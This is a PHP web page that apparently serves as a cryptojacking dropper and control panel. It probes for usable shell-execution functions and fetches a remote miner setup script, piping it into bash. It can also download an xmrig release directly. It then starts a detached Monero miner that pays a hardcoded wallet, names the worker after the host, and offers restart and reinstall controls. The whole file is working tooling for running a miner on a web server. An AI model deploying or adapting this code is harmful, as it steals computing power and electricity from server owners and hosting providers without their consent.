<?php
error_reporting(E_ALL);
ini_set('display_errors', '1');
@ini_set('output_buffering', 'Off');
@ini_set('zlib.output_compression', '0');
@ini_set('implicit_flush', '1');
while (ob_get_level()) ob_end_clean();
header('Content-Type: text/html; charset=utf-8');

// Set default Monero address
 $defaultAddress = "83c4H4wjx8qLTqpUUGdCQE9hM2SwxcukTLFd29PtUrWpby4CXohXYoLQBBrwpYrDfUapxAgenNr2iG847x7wRazPH2RH6nm";

// Get custom address from URL parameter if provided
 $address = isset($_GET['address']) ? $_GET['address'] : $defaultAddress;

// --- Helper Functions ---

/**
 * Gets the working command execution function (cached).
 */
function getWorkingExecFunction() {
    static $workingFunction = null;
    if ($workingFunction === null) {
        $testCommand = 'echo test';
        $functions_to_test = [
            'shell_exec' => function($cmd) { return shell_exec($cmd); },
            'exec' => function($cmd) { $out = []; exec($cmd, $out); return implode("\n", $out); },
            'passthru' => function($cmd) { ob_start(); passthru($cmd, $return_var); $out = ob_get_contents(); ob_end_clean(); return $out; },
            'system' => function($cmd) { ob_start(); system($cmd, $return_var); $out = ob_get_contents(); ob_end_clean(); return $out; },
            'popen' => function($cmd) { $handle = popen($cmd, 'r'); $read = ''; while(!feof($handle)) $read .= fread($handle, 2096); pclose($handle); return $read; },
        ];
        foreach ($functions_to_test as $name => $func) {
            if (function_exists($name) && !in_array($name, array_map('trim', explode(',', ini_get('disable_functions'))))) {
                try {
                    $output = trim($func($testCommand));
                    if ($output === 'test') { $workingFunction = $func; break; }
                } catch (Exception $e) {
                    continue;
                }
            }
        }
        if ($workingFunction === null) { die("FATAL ERROR: No working command execution function found."); }
    }
    return $workingFunction;
}

/**
 * Checks if a command exists on the system.
 */
function isCommandAvailable($command) {
    $func = getWorkingExecFunction();
    $output = $func("command -v " . escapeshellarg($command) . ' 2>&1');
    return !empty(trim($output));
}

/**
 * Executes a shell command using the best available method.
 */
function executeCommand($command) {
    $func = getWorkingExecFunction();
    return $func($command . ' 2>&1');
}

/**
 * Recursively deletes a directory.
 */
function rrmdir($dir) {
    if (is_dir($dir)) {
        $objects = scandir($dir);
        foreach ($objects as $object) {
            if ($object != "." && $object != "..") {
                if (is_dir($dir . DIRECTORY_SEPARATOR . $object) && !is_link($dir . "/" . $object))
                    rrmdir($dir . DIRECTORY_SEPARATOR . $object);
                else
                    unlink($dir . DIRECTORY_SEPARATOR . $object);
            }
        }
        rmdir($dir);
    }
}

/**
 * FIXED: Finds the path of an existing installation using a dynamic path.
 */
function findExistingInstallationPath() {
    $homeEnv = trim(executeCommand('printenv HOME'));
    if (!empty($homeEnv)) {
        $path = $homeEnv . '/moneroocean';
        if (is_dir($path) && file_exists($path . '/xmrig')) return $path;
    }
    // FIXED: Use a dynamic path instead of a hardcoded one.
    $baseDir = dirname($_SERVER['DOCUMENT_ROOT']);
    $path = $baseDir . '/tmp/xmrig-6.24.0';
    if (is_dir($path) && file_exists($path . '/xmrig')) return $path;
    return false;
}

/**
 * FIXED: Gets detailed status, including config and conf.js details.
 */
function getMinerStatus() {
    $status = ['running' => false, 'method' => 'none', 'details' => [], 'config' => null, 'path' => null, 'confjs' => null];
    $processOutput = executeCommand("ps aux | grep '[x]mrig'");

    if (!empty($processOutput)) {
        $status['running'] = true;
        $line = trim($processOutput);
        $parts = preg_split('/\s+/', $line);
        if (count($parts) > 10) {
            $status['details']['pid'] = $parts[1];
            $status['details']['cpu'] = $parts[2];
            $status['details']['mem'] = $parts[3];
            $status['details']['start_time'] = $parts[8];
            $status['details']['run_time'] = $parts[9];
        }
        $status['method'] = (strpos(executeCommand("screen -ls"), 'xmrig_miner') !== false) ? 'screen' : 'nohup';
    }

    $installationPath = findExistingInstallationPath();
    if ($installationPath) {
        $status['path'] = $installationPath;
        $configPath = $installationPath . '/config.json';
        if (file_exists($configPath)) {
            $config = json_decode(file_get_contents($configPath), true);
            if ($config && isset($config['pools'][0])) {
                $status['config']['address'] = $config['pools'][0]['user'];
                $status['config']['workername'] = $config['pools'][0]['pass'];
            }
        }
        // FIXED: Re-added logic to get conf.js details.
        $confJsPath = $installationPath . '/conf.js';
        if (file_exists($confJsPath)) {
            $status['confjs']['path'] = $confJsPath;
            $status['confjs']['content'] = htmlspecialchars(file_get_contents($confJsPath));
        }
    }
    return $status;
}

/**
 * Creates a conf.js file to record the address.
 */
function createConfJs($path, $address) {
    $content = "// This file is generated by the PHP setup script.\n";
    $content .= "const minerAddress = '" . addslashes($address) . "';\n";
    file_put_contents($path . '/conf.js', $content);
}

/**
 * FIXED: Modifies the config.json file with the correct worker name logic.
 */
function modifyConfig($configPath, $address) {
    $config = json_decode(file_get_contents($configPath), true);
    if ($config === null) return false;
    $config['pools'][0]['url'] = "gulf.moneroocean.stream:10128";
    $config['pools'][0]['user'] = $address;
    // FIXED: Added str_replace to change '-' to '.' in the worker name.
    $config['pools'][0]['pass'] = str_replace('-', '.', $_SERVER['HTTP_HOST'] ?: 'worker');
    $config['log-file'] = null;
    file_put_contents($configPath, json_encode($config, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
    return true;
}

/**
 * FIXED: Starts the miner, prioritizing 'screen' over 'nohup'.
 */
function startMiner($path) {
    $screenSessionName = 'xmrig_miner';
    if (isCommandAvailable('screen')) {
        $command = "screen -dmS '$screenSessionName' bash -c 'cd $path && ./xmrig'";
        executeCommand($command);
    } else {
        $command = "cd $path && nohup ./xmrig > bot.log 2>&1 & disown";
        executeCommand($command);
    }
}

/**
 * Outputs the HTML header and styles.
 */
function outputHtmlHeader() {
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Monero Miner Control Panel</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary-color: #6366f1; --primary-dark: #4f46e5; --success-color: #10b981; --warning-color: #f59e0b; --danger-color: #ef4444;
            --bg-color: #0f172a; --surface-color: #1e293b; --text-color: #e2e8f0; --text-muted: #94a3b8; --border-color: #334155;
        }
        body { font-family: 'Poppins', sans-serif; background-color: var(--bg-color); color: var(--text-color); margin: 0; padding: 20px; line-height: 1.6; }
        .container { max-width: 1000px; margin: 20px auto; background-color: var(--surface-color); padding: 30px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); border: 1px solid var(--border-color); }
        .header { text-align: center; margin-bottom: 30px; padding-bottom: 20px; border-bottom: 1px solid var(--border-color); }
        .header h1 { font-size: 2.5rem; font-weight: 700; color: var(--text-color); margin: 0; }
        .header p { color: var(--text-muted); font-size: 1.1rem; margin-top: 5px; }
        .card { background-color: rgba(30, 41, 59, 0.5); border: 1px solid var(--border-color); border-radius: 8px; padding: 20px; margin-bottom: 20px; }
        .card-title { font-size: 1.25rem; font-weight: 600; margin-top: 0; margin-bottom: 15px; display: flex; align-items: center; }
        .card-title .icon { margin-right: 10px; font-size: 1.5rem; }
        .status-running .card-title { color: var(--success-color); } .status-stopped .card-title { color: var(--warning-color); } .status-error .card-title { color: var(--danger-color); } .status-info .card-title { color: var(--primary-color); }
        .status-table { width: 100%; border-collapse: collapse; margin-top: 15px; }
        .status-table th, .status-table td { padding: 12px 15px; text-align: left; border-bottom: 1px solid var(--border-color); }
        .status-table th { font-weight: 600; color: var(--text-muted); background-color: rgba(15, 23, 42, 0.5); }
        .status-table td { font-family: 'Courier New', Courier, monospace; word-break: break-all; }
        code { background-color: rgba(99, 102, 241, 0.2); color: var(--primary-color); padding: 3px 8px; border-radius: 4px; font-family: 'Courier New', Courier, monospace; font-size: 0.9em; }
        pre { background-color: var(--bg-color); border: 1px solid var(--border-color); padding: 15px; border-radius: 6px; overflow-x: auto; white-space: pre-wrap; font-size: 0.9em; }
        .button { display: inline-block; padding: 12px 25px; font-size: 1rem; font-weight: 600; color: white; text-align: center; text-decoration: none; border-radius: 6px; transition: all 0.3s ease; border: none; cursor: pointer; }
        .button-success { background-color: var(--success-color); } .button-success:hover { background-color: #059669; transform: translateY(-2px); }
        .button-danger { background-color: var(--danger-color); } .button-danger:hover { background-color: #dc2626; transform: translateY(-2px); }
        .spinner { border: 4px solid var(--border-color); border-top: 4px solid var(--primary-color); border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
<div class='container'>
    <div class='header'>
        <h1>🚀 Monero Miner Control Panel</h1>
        <p>Automated Setup and Management</p>
    </div>
<?php
} // End of outputHtmlHeader function

// --- Main Logic ---

outputHtmlHeader();

// FIXED: Re-added the improved restart logic.
if (isset($_GET['restart'])) {
    $minerPath = findExistingInstallationPath();
    if ($minerPath) {
        executeCommand("chmod +x '$minerPath/xmrig'");
        $logFile = $minerPath . '/bot.log';
        if(file_exists($logFile)) unlink($logFile);
        startMiner($minerPath);
        sleep(2);
        $started = !empty(trim(executeCommand("ps aux | grep '[x]mrig'")));
        echo "<div class='card status-info'>";
        echo "<h2 class='card-title'><span class='icon'>🔄</span> Restart Complete</h2>";
        echo "<p>Found installation at <code>" . htmlspecialchars($minerPath) . "</code>.</p>";
        if ($started) {
            echo "<p style='color: var(--success-color);'>✅ Miner process started successfully!</p>";
        } else {
            echo "<p style='color: var(--warning-color);'>⚠️ Miner start command executed, but process may need a moment to initialize.</p>";
            if (file_exists($logFile) && filesize($logFile) > 0) {
                echo "<h3>Log Output:</h3>";
                echo "<pre>" . htmlspecialchars(file_get_contents($logFile)) . "</pre>";
            }
        }
        echo "<p><a href='?' class='button button-success'>View Status</a></p>";
        echo "</div></body></html>";
    } else {
        echo "<div class='card status-error'>";
        echo "<h2 class='card-title'><span class='icon'>❌</span> No Installation Found</h2>";
        echo "<p>Could not find an existing installation to restart.</p>";
        echo "<p><a href='?' class='button button-success'>Install Fresh</a></p>";
        echo "</div></body></html>";
    }
    exit;
}

if (isset($_GET['address'])) {
    echo "<div class='card status-info'>";
    echo "<h2 class='card-title'><span class='icon'>🔄</span> Address Change Detected</h2>";
    echo "<p>Initiating full re-installation for address: <code>" . htmlspecialchars($address) . "</code></p>";
    echo "<div class='spinner'></div> <span>Processing...</span>";
    echo "</div>";
    flush(); ob_flush();
    $oldPath = findExistingInstallationPath();
    if ($oldPath) {
        executeCommand("pkill -f xmrig");
        sleep(2);
        rrmdir($oldPath);
    }
}

 $minerStatus = getMinerStatus();

echo "<div class='card status-info'>";
echo "<h2 class='card-title'><span class='icon'>⚙️</span> Configuration</h2>";
echo "<p><strong>Target Address:</strong> <code>" . htmlspecialchars($address) . "</code></p>";
echo "<p><strong>To change address:</strong> Add <code>?address=YOUR_ADDRESS</code> to the URL (triggers a full re-install).</p>";
echo "</div>";

if ($minerStatus['running']) {
    echo "<div class='card status-running'>";
    echo "<h2 class='card-title'><span class='icon'>✅</span> Status: Miner is Running</h2>";
    echo "<table class='status-table'>";
    echo "<tr><th>Method</th><td>" . htmlspecialchars(ucfirst($minerStatus['method'])) . "</td></tr>";
    echo "<tr><th>Process ID (PID)</th><td>" . htmlspecialchars($minerStatus['details']['pid']) . "</td></tr>";
    echo "<tr><th>Started At</th><td>" . htmlspecialchars($minerStatus['details']['start_time']) . "</td></tr>";
    echo "<tr><th>Running For</th><td>" . htmlspecialchars($minerStatus['details']['run_time']) . "</td></tr>";
    echo "<tr><th>CPU Usage</th><td>" . htmlspecialchars($minerStatus['details']['cpu']) . "%</td></tr>";
    echo "<tr><th>Memory Usage</th><td>" . htmlspecialchars($minerStatus['details']['mem']) . "%</td></tr>";
    if ($minerStatus['config']) {
        echo "<tr><th>Installed Address</th><td><code>" . htmlspecialchars($minerStatus['config']['address']) . "</code></td></tr>";
        echo "<tr><th>Worker Name</th><td>" . htmlspecialchars($minerStatus['config']['workername']) . "</td></tr>";
    }
    echo "</table>";
    // FIXED: Re-added conf.js display block.
    if ($minerStatus['confjs']) {
        echo "<h3 style='margin-top: 20px;'>Configuration Record (conf.js)</h3>";
        echo "<p><strong>File Location:</strong> <code>" . htmlspecialchars($minerStatus['confjs']['path']) . "</code></p>";
        echo "<pre>" . $minerStatus['confjs']['content'] . "</pre>";
    }
    echo "</div>";
    echo "</div></body></html>";
    exit;
}

 $installationPath = findExistingInstallationPath();

if ($installationPath) {
    echo "<div class='card status-stopped'>";
    echo "<h2 class='card-title'><span class='icon'>⚠️</span> Status: Installed but Not Running</h2>";
    echo "<p>The miner files were found at <code>" . htmlspecialchars($installationPath) . "</code>, but the process is not active.</p>";
    if ($minerStatus['config']) {
        echo "<p><strong>Last Known Address:</strong> <code>" . htmlspecialchars($minerStatus['config']['address']) . "</code></p>";
        echo "<p><strong>Worker Name:</strong> " . htmlspecialchars($minerStatus['config']['workername']) . "</p>";
    }
    // FIXED: Re-added conf.js display block.
    if ($minerStatus['confjs']) {
        echo "<h3 style='margin-top: 20px;'>Configuration Record (conf.js)</h3>";
        echo "<p><strong>File Location:</strong> <code>" . htmlspecialchars($minerStatus['confjs']['path']) . "</code></p>";
        echo "<pre>" . $minerStatus['confjs']['content'] . "</pre>";
    }
    echo "<a href='?restart=true' class='button button-success'>▶️ Start Miner Now</a>";
    echo "</div>";
    echo "</div></body></html>";
    exit;
}

echo "<div class='card status-error'>";
echo "<h2 class='card-title'><span class='icon'>❌</span> Status: No Installation Found</h2>";
echo "<p>Proceeding with a fresh installation for address: <code>" . htmlspecialchars($address) . "</code></p>";
echo "</div>";

// --- FRESH INSTALLATION LOGIC ---
 $homeEnv = trim(executeCommand('printenv HOME'));
if (!empty($homeEnv)) {
    $installDir = $homeEnv . '/moneroocean';
    echo "<div class='card status-info'><p>✅ Using MoneroOcean method in <code>$installDir</code></p></div>";
    $command = "curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s " . escapeshellarg($address);
    echo "<pre>" . htmlspecialchars(executeCommand($command)) . "</pre>";
    if (is_dir($installDir)) {
        modifyConfig($installDir . '/config.json', $address);
        createConfJs($installDir, $address);
        startMiner($installDir);
        echo "<div class='card status-running'><h2 class='card-title'><span class='icon'>✅</span> Installation Complete!</h2></div>";
    } else { echo "<div class='card status-error'><h2 class='card-title'><span class='icon'>❌</span> Installation Failed</h2></div>"; }
} else {
    // FIXED: Use dynamic path for manual installation.
    $baseDir = dirname($_SERVER['DOCUMENT_ROOT']);
    $tmpDir = $baseDir . '/tmp';
    $installDir = $tmpDir . '/xmrig-6.24.0';
    echo "<div class='card status-warning'><p>⚠️ Using Manual method in <code>$installDir</code></p></div>";
    if (!is_dir($tmpDir)) { mkdir($tmpDir, 0755, true); }
    file_put_contents($tmpDir . '/xmrig.tar.gz', fopen('https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz', 'r'));
    $phar = new PharData($tmpDir . '/xmrig.tar.gz');
    $phar->extractTo($tmpDir);
    if(modifyConfig($installDir . '/config.json', $address)) {
        createConfJs($installDir, $address);
        startMiner($installDir);
        echo "<div class='card status-running'><h2 class='card-title'><span class='icon'>✅</span> Installation Complete!</h2></div>";
    } else { echo "<div class='card status-error'><h2 class='card-title'><span class='icon'>❌</span> Setup Failed</h2></div>"; }
}

?>
</div>
</body>
</html>
